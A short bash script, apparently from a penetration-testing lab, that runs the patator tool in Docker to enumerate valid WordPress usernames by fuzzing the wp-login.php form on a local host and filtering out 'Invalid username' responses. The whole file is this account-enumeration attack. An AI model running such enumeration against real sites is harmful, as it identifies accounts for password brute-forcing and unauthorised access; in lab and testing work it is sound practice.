#!/usr/bin/env bash

users='/tmp/users.txt'
url='http://127.0.0.1:9999/wp-login.php'
ignore='Invalid username'

docker run --rm -it -v $users:/F0 \
patator http_fuzz url=$url method=POST \
body='log=FILE0&pwd=x' \
0=/F0 -x ignore:fgrep="$ignore"
